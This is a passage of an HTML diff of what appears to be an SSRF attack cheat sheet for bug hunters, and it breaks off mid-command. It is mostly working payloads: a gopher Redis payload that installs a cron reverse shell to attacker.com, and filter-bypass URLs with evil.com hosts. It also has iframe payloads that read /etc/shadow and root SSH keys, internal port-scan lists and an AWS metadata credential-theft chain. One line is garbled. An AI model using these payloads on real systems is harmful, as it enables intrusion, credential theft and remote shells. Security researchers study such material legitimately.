-</span></span></code></pre></div><p><strong>MySQL (port 3306) – Dump users</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gopher://127.0.0.1:3306/_J%00%00%01%8d%a6%00%00%00%00%01%08%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00username%00%00mysql_native_password%00...
-</span></span></code></pre></div><p><strong>8. curl URL Globbing + file:// – WAF/Path Filter Bypass</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gopher://127.0.0.1:8080/_GET%20/admin%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0a
+</span></span><span style="display:flex;"><span>gopher://127.0.0.1:8000/_POST%20/login%20HTTP/1.1%0d%0aHost:%20localhost%0d%0aCookie:%20admin<span style="color:#f92672">=</span>true%0d%0a%0d%0ausername<span style="color:#f92672">=</span>admin%27%20or%201<span style="color:#f92672">=</span>1--</span></span></code></pre></div><p><strong>Redis RCE</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$%d%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1%0d%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$%d%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a</span></span></code></pre></div><p><strong>MySQL (port 3306) – Dump users</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gopher://127.0.0.1:3306/_J%00%00%01%8d%a6%00%00%00%00%01%08%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00username%00%00mysql_native_password%00...</span></span></code></pre></div><p><strong>8. curl URL Globbing + file:// – WAF/Path Filter Bypass</strong></p>
 <p>When file:// is blocked but curl is used under the hood.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>file:///app/<span style="color:#f92672">{</span>.,<span style="color:#f92672">}</span>./<span style="color:#f92672">{</span>.,<span style="color:#f92672">}</span>./<span style="color:#f92672">{</span>.,<span style="color:#f92672">}</span>./flag.txt
-</span></span><span style="display:flex;"><span>file:///etc/<span style="color:#f92672">{</span>passwd,shadow,hosts<span style="color:#f92672">}</span>
-</span></span></code></pre></div><h2 id="attack-surface">
-  Attack Surface
-  <a class="anchor" href="#attack-surface">#</a>
-</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>file:///app/<span style="color:#f92672">{</span>.,<span style="color:#f92672">}</span>./<span style="color:#f92672">{</span>.,<span style="color:#f92672">}</span>./<span style="color:#f92672">{</span>.,<span style="color:#f92672">}</span>./flag.txt
+</span></span><span style="display:flex;"><span>file:///etc/<span style="color:#f92672">{</span>passwd,shadow,hosts<span style="color:#f92672">}</span></span></span></code></pre></div><h2 id="attack-surface">Attack Surface<a class="anchor" href="#attack-surface">#</a></h2>
 <p>Common places where SSRF appears:</p>
 <ul>
 <li>
@@ -1455,10 +1411,9 @@ Example: “<strong>Add document from web</strong>” → you enter <code>http:/
 <p><strong>XML / SOAP / GraphQL endpoints accepting external entities</strong>
 When the app parses XML you send, it may resolve external URLs inside the XML (XXE → SSRF).
 Example: You send the below payload and then the server fetches AWS metadata.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml *version*=&#34;1.0&#34;?&gt;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml *version*=&#34;1.0&#34;?&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM &#34;http://169.254.169.254/&#34;&gt;</span>]&gt;
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;root&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/root&gt;</span>
-</span></span></code></pre></div></li>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;root&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/root&gt;</span></span></span></code></pre></div></li>
 <li>
 <p><strong>Referer header analytics</strong>
 Some internal analytics tools automatically visit every URL that appears in the HTTP Referer header of incoming requests.
@@ -1472,14 +1427,8 @@ Almost every cloud instance (AWS, GCP, Azure, DigitalOcean, etc.) has a magic IP
 Example: If you can make the server request <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/YourRole</code>, you instantly steal AWS keys that often have full admin rights.</p>
 </li>
 </ul>
-<h2 id="bypassing-defenses">
-  Bypassing Defenses
-  <a class="anchor" href="#bypassing-defenses">#</a>
-</h2>
-<h3 id="blacklist-based-bypasses">
-  Blacklist-based Bypasses
-  <a class="anchor" href="#blacklist-based-bypasses">#</a>
-</h3>
+<h2 id="bypassing-defenses">Bypassing Defenses<a class="anchor" href="#bypassing-defenses">#</a></h2>
+<h3 id="blacklist-based-bypasses">Blacklist-based Bypasses<a class="anchor" href="#blacklist-based-bypasses">#</a></h3>
 <ol>
 <li>
 <p><strong>Alternative IP Notations</strong>
@@ -1488,15 +1437,13 @@ Blacklists usually only block dotted decimal format. Converting the same IP to d
 017700000001                → 127.0.0.1 (octal)
 0x7f000001                  → 127.0.0.1 (hex)
 0xc0a80001                  → 192.168.0.1
-2852039166                  → 169.254.169.254
-</code></pre></li>
+2852039166                  → 169.254.169.254</code></pre></li>
 <li>
 <p><strong>CIDR / Loopback Range Abuse</strong>
 The entire 127.0.0.0/8 range points to localhost. Most blacklists only block 127.0.0.1, so any other address in this range works.</p>
 <pre tabindex="0"><code>http://127.127.127.127
 http://127.0.1.3
-http://127.0.0.0
-</code></pre></li>
+http://127.0.0.0</code></pre></li>
 <li>
 <p><strong>Shortened &amp; Rare Forms</strong>
 Some parsers accept incomplete or malformed IPs that still resolve to loopback.</p>
@@ -1504,16 +1451,14 @@ Some parsers accept incomplete or malformed IPs that still resolve to loopback.<
 http://127.0.1
 http://0/
 localhost:+11211aaa
-localhost:00011211aaaa
-</code></pre></li>
+localhost:00011211aaaa</code></pre></li>
 <li>
 <p><strong>Mixed &amp; Weird Encodings</strong>
 Full-width characters, mixed bases, or unusual dot symbols are invisible to most blacklist regexes.</p>
 <pre tabindex="0"><code>127。0。0。1                     (full-width dots)
 127%E3%80%820%E3%80%820%E3%80%821
 0xA9.0xFE.0251.0376            (mixed hex/decimal/octal)
-169.254.43518                  (partial decimal class B)
-</code></pre></li>
+169.254.43518                  (partial decimal class B)</code></pre></li>
 <li>
 <p><strong>DNS Rebinding &amp; Loopback Domains</strong>
 Domains that resolve to 127.0.0.1 or 169.254.169.254 are almost never blacklisted.</p>
@@ -1521,52 +1466,42 @@ Domains that resolve to 127.0.0.1 or 169.254.169.254 are almost never blackliste
 127.0.0.1.nip.io
 bugbounty.dod.network       → 127.0.0.2
 1ynrnhl.xip.io              → 169.254.169.254
-spoofed.burpcollaborator.net
-</code></pre></li>
+spoofed.burpcollaborator.net</code></pre></li>
 <li>
 <p><strong>Enclosed Alphanumeric &amp; Unicode Hosts</strong>
 Unicode circled/full-width letters look like normal text but are treated as valid hostnames by many parsers.</p>
 <pre tabindex="0"><code>http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ
-http://ｌｏｃａｌｈｏｓｔ
-</code></pre></li>
+http://ｌｏｃａｌｈｏｓｔ</code></pre></li>
 <li>
 <p><strong>IPv6 Hostname Tricks (Linux)</strong>
 /etc/hosts contains alternative names for ::1 that are rarely blocked.</p>
 <pre tabindex="0"><code>http://ip6-localhost
-http://ip6-loopback
-</code></pre></li>
+http://ip6-loopback</code></pre></li>
 <li>
 <p><strong>URL Encoding on Path</strong>
 After a whitelisted host, encoded slashes or paths are often ignored by filters.</p>
 <pre tabindex="0"><code>http://allowed.com/%61dmin
-http://allowed.com/%2561dmin
-</code></pre></li>
+http://allowed.com/%2561dmin</code></pre></li>
 </ol>
-<h3 id="whitelist-based-bypasses">
-  Whitelist-based Bypasses
-  <a class="anchor" href="#whitelist-based-bypasses">#</a>
-</h3>
+<h3 id="whitelist-based-bypasses">Whitelist-based Bypasses<a class="anchor" href="#whitelist-based-bypasses">#</a></h3>
 <ol>
 <li>
 <p><strong>Embedded Credentials &amp; @ Confusion</strong>
 Most validators extract everything before the final @. HTTP clients use everything after it → perfect mismatch.</p>
 <pre tabindex="0"><code>http://legit.com@evil.com
 http://legit.com:pass@192.168.0.68
-http://legit.com#@evil.com
-</code></pre></li>
+http://legit.com#@evil.com</code></pre></li>
 <li>
 <p><strong>URL Fragment Injection</strong>
 The fragment (#…) is stripped before the request is made, but naive whitelists see the allowed domain inside it.</p>
 <pre tabindex="0"><code>http://192.168.0.68#legit.com
 http://169.254.169.254/latest/meta-data/#legit.com
-http://evil.com%23@legit.com
-</code></pre></li>
+http://evil.com%23@legit.com</code></pre></li>
 <li>
 <p><strong>DNS Hierarchy &amp; Subdomain Injection</strong>
 Whitelists that check domain.endsWith(&ldquo;legit.com&rdquo;) or domain.contains(&ldquo;legit.com&rdquo;) can be fooled by registering legit.com.evil.com.</p>
 <pre tabindex="0"><code>http://legit.com.evil.com
-http://legit.com.attacker-controlled.com
-</code></pre></li>
+http://legit.com.attacker-controlled.com</code></pre></li>
 <li>
 <p><strong>Parser Discrepancy &amp; Special Characters</strong>
 Validation library and actual HTTP client disagree on backslashes, brackets, encoded characters, etc.</p>
@@ -1575,39 +1510,33 @@ https://evil.com#@legit.com
 https://[fe80::1%25eth0]
 https://example.com[@evil.com
 http://127.1.1.1:80\@127.2.2.2:80/
-http://127.1.1.1:80#\@127.2.2.2:80/
-</code></pre></li>
+http://127.1.1.1:80#\@127.2.2.2:80/</code></pre></li>
 <li>
 <p><strong>Path / Extension After Allowed Host</strong>
 Filters that only validate the hostname ignore fragments and encoded traversals.</p>
 <pre tabindex="0"><code>http://legit.com/#/admin
 http://legit.com#.jpg
-http://legit.com/..%2f..%2f169.254.169.254/latest/meta-data/
-</code></pre></li>
+http://legit.com/..%2f..%2f169.254.169.254/latest/meta-data/</code></pre></li>
 <li>
 <p><strong>Parameter Pollution</strong>
 When the backend takes the last (or first) occurrence of a duplicated parameter, you can hide the malicious URL.</p>
 <pre tabindex="0"><code>url=legit.com&amp;url=http://169.254.169.254
-next=legit.com&amp;next=evil.com
-</code></pre></li>
+next=legit.com&amp;next=evil.com</code></pre></li>
 <li>
 <p><strong>Host Header Injection</strong>
 Some backends trust the Host header over the URL hostname.</p>
 <pre tabindex="0"><code>Host: 127.0.0.1
-Host: [::1]
-</code></pre></li>
+Host: [::1]</code></pre></li>
 <li>
 <p><strong>Open Redirection Chaining</strong>
 Point to any open redirect inside a whitelisted domain → server follows 3xx after validation → reaches anything.</p>
 <pre tabindex="0"><code>stockApi=http://allowed.com/redirect?url=http://127.0.0.1/admin
-stockApi=http://allowed.com/redirect?next=http://169.254.169.254/
-</code></pre></li>
+stockApi=http://allowed.com/redirect?next=http://169.254.169.254/</code></pre></li>
 <li>
 <p><strong>JAR Scheme (Java only, blind)</strong>
 Java’s URL class accepts jar: URLs and fetches the inner URL silently.</p>
 <pre tabindex="0"><code>jar:http://127.0.0.1!/
-jar:https://169.254.169.254!/
-</code></pre></li>
+jar:https://169.254.169.254!/</code></pre></li>
 <li>
 <p><strong>DNS Rebinding (time-based)</strong>
 The domain is configured to rapidly switch its resolved IP between your public server and the desired internal address (e.g., 127.0.0.1 or 169.254.169.254). Because the SSRF filter checks DNS once at validation time, one of the responses will point to the internal target, allowing the back-end request to reach otherwise blocked hosts.</p>
@@ -1615,14 +1544,13 @@ The domain is configured to rapidly switch its resolved IP between your public s
 <strong>Example domain that rotates between 1.2.3.4 (your IP) and 169.254.169.254 (cloud metadata):</strong></p>
 <p><a href="http://make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms/" target="_blank" rel="noreferrer noopener nofollow"><code>make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms</code></a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
 <p><strong>Verification with nslookup (it flips on each query):</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ nslookup make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ nslookup make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms
 </span></span><span style="display:flex;"><span>Name:   make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms
 </span></span><span style="display:flex;"><span>Address: 1.2.3.4
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>$ nslookup make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms
 </span></span><span style="display:flex;"><span>Name:   make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms
-</span></span><span style="display:flex;"><span>Address: 169.254.169.254
-</span></span></code></pre></div><p>Works  against strict whitelists/blacklists when the TTL is low and the backend doesn’t cache DNS aggressively.</p>
+</span></span><span style="display:flex;"><span>Address: 169.254.169.254</span></span></code></pre></div><p>Works  against strict whitelists/blacklists when the TTL is low and the backend doesn’t cache DNS aggressively.</p>
 </li>
 <li>
 <p><strong>Open Redirection Chaining (Self-hosted or Public)</strong></p>
@@ -1647,14 +1575,8 @@ The domain is configured to rapidly switch its resolved IP between your public s
 <p>Just submit one of these URLs to the vulnerable parameter – filter passes, redirect executes, internal target reached.</p>
 </li>
 </ol>
-<h2 id="advance-attack-scenarios">
-  Advance Attack Scenarios
-  <a class="anchor" href="#advance-attack-scenarios">#</a>
-</h2>
-<h3 id="1-pdf-generation-to-root-shell-via-ssrf--lfi">
-  1. PDF Generation to Root Shell via SSRF + LFI
-  <a class="anchor" href="#1-pdf-generation-to-root-shell-via-ssrf--lfi">#</a>
-</h3>
+<h2 id="advance-attack-scenarios">Advance Attack Scenarios<a class="anchor" href="#advance-attack-scenarios">#</a></h2>
+<h3 id="1-pdf-generation-to-root-shell-via-ssrf--lfi">1. PDF Generation to Root Shell via SSRF + LFI<a class="anchor" href="#1-pdf-generation-to-root-shell-via-ssrf--lfi">#</a></h3>
 <p><strong>Summary</strong>
 The PDF generator renders user-supplied content as raw HTML with high privileges and no sandbox. A single iframe gives full external SSRF + arbitrary local file read, often leading to instant root compromise.</p>
 <p><strong>Affected Technologies</strong>
@@ -1672,26 +1594,21 @@ Insert <code>&quot;&gt;&lt;iframe src=&quot;https://YOUR-COLLAB.oastify.com&quot
 <li>
 <p><strong>Read any file on the server</strong>
 Insert any of the following, generate the PDF, and the file content will be displayed inside it:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&#34;&gt;&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file:///etc/passwd&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">1000</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">1000</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&#34;&gt;&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file:///etc/passwd&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">1000</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">1000</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
 </span></span><span style="display:flex;"><span>&#34;&gt;&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file:///etc/shadow&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">1000</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">1000</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
 </span></span><span style="display:flex;"><span>&#34;&gt;&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file:///root/.ssh/id_rsa&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">1000</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">1000</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
 </span></span><span style="display:flex;"><span>&#34;&gt;&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file:///var/www/html/.env&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">1000</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">1000</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
-</span></span><span style="display:flex;"><span>&#34;&gt;&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file:///proc/self/environ&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">1000</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">1000</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
-</span></span></code></pre></div></li>
+</span></span><span style="display:flex;"><span>&#34;&gt;&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file:///proc/self/environ&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">1000</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">1000</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;</span></span></code></pre></div></li>
 <li>
 <p><strong>Gain shell</strong>
 Copy the private key <code>id_rsa</code> from the PDF → SSH/login as root or application user</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&#34;&gt;&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file:///etc/passwd&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">1000</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">1000</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&#34;&gt;&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file:///etc/passwd&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">1000</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">1000</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
 </span></span><span style="display:flex;"><span>&#34;&gt;&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file:///root/.ssh/id_rsa&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">1000</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">1000</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
-</span></span><span style="display:flex;"><span>&#34;&gt;&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file:///etc/shadow&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">1000</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">1000</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
-</span></span></code></pre></div></li>
+</span></span><span style="display:flex;"><span>&#34;&gt;&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file:///etc/shadow&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">1000</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">1000</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;</span></span></code></pre></div></li>
 </ol>
 <p><strong>Impact</strong>
 Many PDF export features rely on unsandboxed HTML renderers (e.g., wkhtmltopdf, PDFReacter, or headless Chromium) running with elevated privileges. When user input is rendered without proper sanitization, a single iframe grants external SSRF and unrestricted local file disclosure via the file:// scheme, frequently resulting in full server compromise</p>
-<h3 id="2-blind-ssrf-internal-port-scanning-via-status-code-differentiation">
-  2. Blind SSRF Internal Port Scanning via Status Code Differentiation
-  <a class="anchor" href="#2-blind-ssrf-internal-port-scanning-via-status-code-differentiation">#</a>
-</h3>
+<h3 id="2-blind-ssrf-internal-port-scanning-via-status-code-differentiation">2. Blind SSRF Internal Port Scanning via Status Code Differentiation<a class="anchor" href="#2-blind-ssrf-internal-port-scanning-via-status-code-differentiation">#</a></h3>
 <p><strong>Summary</strong>
 When the SSRF is completely blind (no body, no timing difference), many back-ends still return different HTTP status codes or response lengths depending on whether the target port is open or closed. By forcing HTTPS-only requests and cycling through ports, you can silently enumerate all open internal services.</p>
 <p><strong>Steps to Reproduce (Exact &amp; Clear)</strong></p>
@@ -1715,7 +1632,7 @@ Send: <code>https://127.0.0.1:12345</code> (random high port)
 <li>
 <p><strong>Start systematic port scan</strong>
 Replace PORT and fire one by one. Compare status code + response length against your open/closed baseline.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>https://127.0.0.1:22
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>https://127.0.0.1:22
 </span></span><span style="display:flex;"><span>https://127.0.0.1:25
 </span></span><span style="display:flex;"><span>https://127.0.0.1:80
 </span></span><span style="display:flex;"><span>https://127.0.0.1:443
@@ -1726,8 +1643,7 @@ Replace PORT and fire one by one. Compare status code + response length against 
 </span></span><span style="display:flex;"><span>https://127.0.0.1:8080
 </span></span><span style="display:flex;"><span>https://127.0 enorm.0.1:9200
 </span></span><span style="display:flex;"><span>https://127.0.0.1:11211
-</span></span><span style="display:flex;"><span>https://127.0.0.1:27017
-</span></span></code></pre></div><p>Any port that returns the “open” signature you recorded in step 2 is confirmed open.</p>
+</span></span><span style="display:flex;"><span>https://127.0.0.1:27017</span></span></code></pre></div><p>Any port that returns the “open” signature you recorded in step 2 is confirmed open.</p>
 </li>
 <li>
 <p><strong>Optional: Scan internal IPs</strong>
@@ -1737,10 +1653,7 @@ Same technique, just change the host:
 </ol>
 <p><strong>Impact</strong>
 Turns a zero-visibility blind SSRF into a full internal port scanner. Discovering Redis (6379), Elasticsearch (9200), internal admin panels (8080/8443), or cloud metadata (169.254.169.254) instantly escalates the finding from Medium → Critical.</p>
-<h3 id="3-open-redirect-to-full-ssrf-escalation-live-chat-proxy-chain">
-  3. Open Redirect to Full SSRF Escalation (Live Chat Proxy Chain)
-  <a class="anchor" href="#3-open-redirect-to-full-ssrf-escalation-live-chat-proxy-chain">#</a>
-</h3>
+<h3 id="3-open-redirect-to-full-ssrf-escalation-live-chat-proxy-chain">3. Open Redirect to Full SSRF Escalation (Live Chat Proxy Chain)<a class="anchor" href="#3-open-redirect-to-full-ssrf-escalation-live-chat-proxy-chain">#</a></h3>
 <p><strong>Summary</strong>
 Live chat integrations (LivePerson, Zendesk, Intercom, Freshchat, etc.) are often proxied through the application’s back-end. When the provider endpoint contains an open redirect (commonly via parameters like onlineURL, return_to, redirect_to) and the proxy follows redirects, an external open redirect is transformed into unrestricted SSRF originating from the main application domain.</p>
 <p><strong>Exploitation Steps</strong></p>
@@ -1766,10 +1679,9 @@ Common parameters:</p>
 <li>
 <p><strong>Construct the SSRF payload</strong>
 Force the back-end request to the provider URL that redirects to the internal target:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>https://target.com/chat?cmd=file<span style="color:#960050;background-color:#1e0010">&amp;</span>file=visitorWantsToChat<span style="color:#960050;background-color:#1e0010">&amp;</span>onlineURL=http://169.254.169.254/latest/meta-data/<span style="color:#960050;background-color:#1e0010">&amp;</span>site=123456
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>https://target.com/chat?cmd=file<span style="color:#960050;background-color:#1e0010">&amp;</span>file=visitorWantsToChat<span style="color:#960050;background-color:#1e0010">&amp;</span>onlineURL=http://169.254.169.254/latest/meta-data/<span style="color:#960050;background-color:#1e0010">&amp;</span>site=123456
 </span></span><span style="display:flex;"><span>https://target.com/chat?return_to=http://127.0.0.1/admin
-</span></span><span style="display:flex;"><span>https://target.com/chat?redirect_to=http://192.168.0.10:8080/debug
-</span></span></code></pre></div></li>
+</span></span><span style="display:flex;"><span>https://target.com/chat?redirect_to=http://192.168.0.10:8080/debug</span></span></code></pre></div></li>
 <li>
 <p><strong>Optional: Path traversal escape (LivePerson-specific)</strong>
 Break out of the /api/ base path using encoded backslashes
@@ -1778,10 +1690,7 @@ Break out of the /api/ base path using encoded backslashes
 </ol>
 <p><strong>Impact</strong>
 Completely bypasses all local SSRF mitigations because the initial request targets a legitimate, whitelisted third-party domain. Regularly yields access to internal administration interfaces, cloud instance metadata, databases, and cache services. One of the most effective and frequently rewarded SSRF escalation techniques in large-scale programs (Airbnb, Shopify, Uber, etc.).</p>
-<h3 id="4-ssrf-to-root-rce-via-aws-iam-abuse">
-  4. SSRF to Root RCE via AWS IAM Abuse
-  <a class="anchor" href="#4-ssrf-to-root-rce-via-aws-iam-abuse">#</a>
-</h3>
+<h3 id="4-ssrf-to-root-rce-via-aws-iam-abuse">4. SSRF to Root RCE via AWS IAM Abuse<a class="anchor" href="#4-ssrf-to-root-rce-via-aws-iam-abuse">#</a></h3>
 <p><strong>Summary</strong>
 A restricted SSRF that blocks private IPs can be bypassed by omitting the scheme. This grants access to the EC2 Instance Metadata Service (IMDSv1), leaking temporary IAM role credentials. These credentials are then used to overwrite the instance’s UserData with a malicious script. Restarting the instance executes the payload on boot, resulting in a root reverse shell — one of the most severe AWS escalation chains.</p>
 <p><strong>Exploitation Steps</strong></p>
@@ -1805,21 +1714,18 @@ Query the role name discovered in step 2:</p>
 </li>
 <li>
 <p><strong>Configure stolen credentials locally</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws configure --profile ssrf-pwn 
